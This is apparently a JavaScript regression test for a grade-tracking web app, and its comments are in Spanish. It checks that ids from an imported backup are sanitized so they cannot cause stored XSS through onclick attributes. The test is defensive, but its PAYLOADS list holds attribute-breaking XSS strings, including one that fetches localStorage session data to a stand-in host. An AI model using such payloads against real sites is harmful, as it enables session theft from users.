// XSS almacenado por la vía de importar un respaldo.
//
// Los ids se interpolan crudos dentro de atributos onclick —
// `onclick="toggleCat('<id>')"`, y hay ~30 sitios así—. `uid()` solo genera
// [a-z0-9], pero un id NO siempre lo genera la app: al importar un respaldo se
// conservaba el que viniera en el JSON, y `esExportValido` solo comprueba que
// `ramos` sea un arreglo.
//
// Pegar un respaldo ajeno bastaba para ejecutar JS con la sesión de Supabase en
// localStorage al alcance. Los respaldos se comparten entre compañeros, así que
// el camino era realista, no teórico.
//
// Se cierra en la frontera: un id que no calce con el formato se reemplaza. Es
// preferible a escapar en 30 sitios de render, porque olvidar uno reabre todo.
const fs = require('fs'), vm = require('vm');
const raiz = __dirname + '/../';
const src = ['data.js', 'engine.js', 'app.js', 'render-agenda.js']
  .map(f => fs.readFileSync(raiz + f, 'utf8')).join('\n');

const stub = { style: { setProperty() {}, removeProperty() {} }, addEventListener() {}, appendChild() {}, classList: { add() {}, remove() {}, contains() { return false } }, value: '', innerHTML: '', textContent: '', focus() {}, select() {}, setAttribute() {}, removeAttribute() {}, getAttribute() { return null }, querySelectorAll() { return [] }, querySelector() { return stub }, clientWidth: 400, dataset: {}, click() {} };
const ctx = {
  window: { addEventListener() {}, matchMedia: () => ({ matches: true, addEventListener() {}, addListener() {} }) },
  document: { getElementById: () => stub, createElement: () => stub, addEventListener() {}, documentElement: { style: { setProperty() {}, removeProperty() {} }, setAttribute() {}, removeAttribute() {}, getAttribute() { return null } }, querySelector: () => stub, querySelectorAll: () => [], body: stub },
  localStorage: { getItem() { return null }, setItem() {}, removeItem() {} },
  navigator: {}, location: { origin: '', pathname: '', hash: '' }, setTimeout, clearTimeout, console,
};
vm.createContext(ctx); vm.runInContext(src, ctx);
const val = n => vm.runInContext(n, ctx);
const normalize = val('normalize'), idSeguro = val('idSeguro'), esc = val('esc');

let ok = 0, fail = 0;
const chk = (n, c) => { if (c) { ok++; console.log('  OK   ' + n); } else { fail++; console.log('  FAIL ' + n); } };

// Las cargas útiles que rompen `onclick="f('<id>')"`.
const PAYLOADS = [
  `x');alert(1);//`,                       // cierra la llamada
  `y" onmouseover="alert(1)`,              // cierra el atributo
  `z');fetch('//malo.cl?d='+localStorage.gradehub_v1);//`, // exfiltración real
  `<img src=x onerror=alert(1)>`,
  `'`, `"`, `\\`, '</script>', 'a b', 'á', '',
];

console.log('\n=== Un id con comillas nunca sobrevive ===');
PAYLOADS.forEach(p => {
  const limpio = idSeguro(p);
  chk(`rechaza ${JSON.stringify(p).slice(0, 42)}`, /^[A-Za-z0-9_-]{1,64}$/.test(limpio) && limpio !== p);
});
chk('un id legítimo de uid() se conserva', idSeguro('m9x2k1abc') === 'm9x2k1abc');
chk('los ids que genera la app pasan el filtro', /^[A-Za-z0-9_-]{1,64}$/.test(val('uid')()));
chk('un id no-string se reemplaza', /^[A-Za-z0-9_-]+$/.test(idSeguro({ toString: () => "');alert(1);//" })));
chk('un id larguísimo se reemplaza', idSeguro('a'.repeat(200)).length <= 64);

console.log('\n=== El respaldo importado queda inofensivo ===');
const malicioso = {
  ramos: [{
    id: `r');alert(1);//`, nombre: 'Cálculo', color: '#fff',
    categorias: [{
      id: `c');alert(1);//`, nombre: 'P', peso: 100,
      notas: [{ id: `n" onerror="alert(1)`, nombre: 'P1', valor: 5, peso: 1 }],
    }],
  }],
  // El historial guarda ramos completos y sus ids llegan a los mismos atributos.
  historial: [{
    id: `h');alert(1);//`, label: 'Semestre', ramos: [{
      id: `hr');alert(1);//`, nombre: 'X',
      categorias: [{ id: `hc');alert(1);//`, nombre: 'Y', peso: 100, notas: [{ id: `hn');alert(1);//`, valor: 4 }] }],
    }],
  }],
};
const limpio = normalize(JSON.parse(JSON.stringify(malicioso)));
const idsDe = d => [
  ...d.ramos.flatMap(r => [r.id, ...r.categorias.flatMap(c => [c.id, ...c.notas.map(n => n.id)])]),
  ...d.historial.flatMap(h => [h.id, ...(h.ramos || []).flatMap(r => [r.id, ...(r.categorias || []).flatMap(c => [c.id, ...(c.notas || []).map(n => n.id)])])]),
];
const ids = idsDe(limpio);
// 3 del semestre actual (ramo, categoría, nota) + 4 del historial.
chk('se revisaron todos los ids, incluido el historial', ids.length === 7);
chk('ninguno conserva comillas ni corchetes', ids.every(i => /^[A-Za-z0-9_-]{1,64}$/.test(i)));
// La prueba que de verdad importa: reconstruir el atributo y ver si se rompe.
const atributos = ids.map(i => `onclick="toggleCat('${i}')"`);
chk('ningún atributo onclick se puede romper',
  atributos.every(a => (a.match(/'/g) || []).length === 2 && (a.match(/"/g) || []).length === 2));

console.log('\n=== Lo que sí se conserva ===');
// Sanear ids no puede convertirse en perder datos del estudiante.
chk('los nombres no se tocan', limpio.ramos[0].nombre === 'Cálculo');
chk('las notas no se tocan', limpio.ramos[0].categorias[0].notas[0].valor === 5);
chk('el historial conserva sus ramos', limpio.historial[0].ramos.length === 1);
const bueno = normalize({ ramos: [{ id: 'abc123', nombre: 'X', categorias: [{ id: 'def456', nombre: 'Y', peso: 10, notas: [] }] }] });
chk('un respaldo legítimo mantiene sus ids intactos',
  bueno.ramos[0].id === 'abc123' && bueno.ramos[0].categorias[0].id === 'def456');

console.log('\n=== El escapador sigue cubriendo los cinco caracteres ===');
chk('esc cubre & < > " y \'', esc(`&<>"'`) === '&amp;&lt;&gt;&quot;&#39;');
// Los colores vienen del respaldo igual que los ids y van a atributos style.
chk('los colores se escapan en el render',
  !/\$\{[^}]*\.color\}/.test(src));

console.log('\nPASS: ' + ok + '   FAIL: ' + fail);
process.exit(fail ? 1 : 0);
